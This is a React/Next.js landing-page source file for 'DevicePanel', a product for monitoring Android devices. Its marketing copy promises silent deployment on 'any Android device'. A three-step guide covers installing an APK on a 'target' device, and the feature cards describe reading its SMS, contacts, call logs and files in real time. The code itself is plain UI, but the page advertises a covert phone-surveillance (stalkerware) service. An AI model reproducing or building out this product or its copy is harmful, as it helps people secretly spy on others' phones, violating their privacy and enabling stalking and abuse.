"use client";

import Link from "next/link";
import { FiSmartphone, FiShield, FiMonitor, FiDownload, FiUsers, FiZap, FiArrowRight, FiCheckCircle } from "react-icons/fi";

export default function LandingPage() {
  return (
    <div className="min-h-screen bg-gradient-to-b from-background via-background to-secondary/30">
      {/* Nav */}
      <nav className="sticky top-0 z-50 border-b border-border/40 bg-background/80 backdrop-blur-xl">
        <div className="mx-auto flex max-w-7xl items-center justify-between px-6 py-4">
          <div className="flex items-center gap-2">
            <div className="flex h-8 w-8 items-center justify-center rounded-lg bg-primary">
              <FiSmartphone className="h-4 w-4 text-primary-foreground" />
            </div>
            <span className="text-lg font-bold">DevicePanel</span>
          </div>
          <div className="flex items-center gap-4">
            <Link href="/login">
              <span className="text-sm text-muted-foreground hover:text-foreground transition-colors">Sign in</span>
            </Link>
            <Link
              href="/login"
              className="rounded-lg bg-primary px-4 py-2 text-sm font-medium text-primary-foreground hover:bg-primary/90 transition-all"
            >
              Get Started
            </Link>
          </div>
        </div>
      </nav>

      {/* Hero */}
      <section className="relative overflow-hidden px-6 py-24 lg:py-32">
        <div className="absolute inset-0 overflow-hidden">
          <div className="absolute -top-40 -right-40 h-[500px] w-[500px] rounded-full bg-primary/5 blur-3xl" />
          <div className="absolute -bottom-40 -left-40 h-[500px] w-[500px] rounded-full bg-primary/10 blur-3xl" />
        </div>
        <div className="relative mx-auto max-w-4xl text-center">
          <div className="inline-flex items-center gap-2 rounded-full border border-primary/20 bg-primary/5 px-4 py-1.5 text-sm text-primary mb-6">
            <FiZap className="h-3.5 w-3.5" />
            Real-time Device Monitoring Platform
          </div>
          <h1 className="text-4xl font-bold tracking-tight sm:text-6xl bg-gradient-to-r from-foreground via-foreground to-foreground/70 bg-clip-text text-transparent">
            Monitor Android Devices in Real-Time
          </h1>
          <p className="mt-6 text-lg text-muted-foreground max-w-2xl mx-auto">
            Deploy silently on any Android device. View SMS, contacts, call logs, and files through a premium web dashboard with live auto-refresh.
          </p>
          <div className="mt-10 flex items-center justify-center gap-4">
            <Link
              href="/login"
              className="rounded-xl bg-primary px-8 py-3 text-base font-medium text-primary-foreground hover:bg-primary/90 transition-all shadow-lg shadow-primary/25"
            >
              Get Started Free
              <FiArrowRight className="ml-2 inline h-4 w-4" />
            </Link>
            <Link
              href="/login"
              className="rounded-xl border border-border bg-card px-8 py-3 text-base font-medium hover:bg-muted transition-all"
            >
              Sign In
            </Link>
          </div>
        </div>
      </section>

      {/* How It Works */}
      <section className="px-6 py-20">
        <div className="mx-auto max-w-6xl">
          <div className="text-center mb-12">
            <h2 className="text-3xl font-bold">How It Works</h2>
            <p className="text-muted-foreground mt-2">Get started in 3 simple steps</p>
          </div>
          <div className="grid gap-6 md:grid-cols-3">
            {[
              {
                step: "01",
                title: "Create Access Token",
                desc: "Generate a unique token from the admin dashboard. Share it securely with your target device user.",
                icon: FiShield,
              },
              {
                step: "02",
                title: "Install the APK",
                desc: "Download the universal APK. Install it on the target Android device and enter the token on first launch.",
                icon: FiDownload,
              },
              {
                step: "03",
                title: "Monitor Live Data",
                desc: "View SMS, contacts, call logs, and files in real-time through the premium web dashboard. Data refreshes automatically.",
                icon: FiMonitor,
              },
            ].map((item) => (
              <div
                key={item.step}
                className="group relative rounded-2xl border border-border/50 bg-card p-8 hover:border-primary/30 hover:shadow-lg hover:shadow-primary/5 transition-all duration-300"
              >
                <div className="flex items-center gap-3 mb-4">
                  <div className="flex h-10 w-10 items-center justify-center rounded-xl bg-primary/10 text-primary">
                    <item.icon className="h-5 w-5" />
                  </div>
                  <span className="text-sm font-mono text-muted-foreground">{item.step}</span>
                </div>
                <h3 className="text-lg font-semibold mb-2">{item.title}</h3>
                <p className="text-sm text-muted-foreground leading-relaxed">{item.desc}</p>
              </div>
            ))}
          </div>
        </div>
      </section>

      {/* Features */}
      <section className="px-6 py-20">
        <div className="mx-auto max-w-6xl">
          <div className="text-center mb-12">
            <h2 className="text-3xl font-bold">Powerful Features</h2>
            <p className="text-muted-foreground mt-2">Everything you need for device monitoring</p>
          </div>
          <div className="grid gap-6 md:grid-cols-2 lg:grid-cols-3">
            {[
              { title: "Live SMS Monitoring", desc: "View incoming and outgoing SMS messages in real-time with auto-refresh every 3 seconds.", icon: FiSmartphone },
              { title: "Contact Syncing", desc: "Access all device contacts with names, phone numbers, and email addresses.", icon: FiUsers },
              { title: "Call Log Tracking", desc: "Monitor call history including incoming, outgoing, and missed calls with duration.", icon: FiMonitor },
              { title: "File System Access", desc: "Browse and download files directly from the device storage through the dashboard.", icon: FiDownload },
              { title: "Token-Based Security", desc: "Each deployment uses a unique token. Users only see devices linked to their token.", icon: FiShield },
              { title: "Admin Dashboard", desc: "Global overview with total devices, online/offline status, and token management.", icon: FiCheckCircle },
            ].map((feature) => (
              <div
                key={feature.title}
                className="group rounded-2xl border border-border/50 bg-card p-6 hover:border-primary/30 hover:shadow-lg hover:shadow-primary/5 transition-all duration-300"
              >
                <div className="flex h-10 w-10 items-center justify-center rounded-xl bg-primary/10 text-primary mb-4 group-hover:scale-110 transition-transform">
                  <feature.icon className="h-5 w-5" />
                </div>
                <h3 className="font-semibold mb-2">{feature.title}</h3>
                <p className="text-sm text-muted-foreground leading-relaxed">{feature.desc}</p>
              </div>
            ))}
          </div>
        </div>
      </section>

      {/* Stats */}
      <section className="px-6 py-20">
        <div className="mx-auto max-w-4xl">
          <div className="rounded-2xl border border-border/50 bg-card/50 backdrop-blur-sm p-12 text-center">
            <h2 className="text-2xl font-bold mb-4">Ready to Get Started?</h2>
            <p className="text-muted-foreground mb-8 max-w-lg mx-auto">
              Create an admin account, generate your first token, and start monitoring devices in minutes.
            </p>
            <Link
              href="/login"
              className="inline-flex items-center gap-2 rounded-xl bg-primary px-8 py-3 text-base font-medium text-primary-foreground hover:bg-primary/90 transition-all shadow-lg shadow-primary/25"
            >
              Go to Dashboard
              <FiArrowRight className="h-4 w-4" />
            </Link>
          </div>
        </div>
      </section>

      {/* Footer */}
      <footer className="border-t border-border/40 px-6 py-8">
        <div className="mx-auto max-w-6xl text-center text-sm text-muted-foreground">
          DevicePanel &mdash; Advanced Device Management Platform
        </div>
      </footer>
    </div>
  );
}
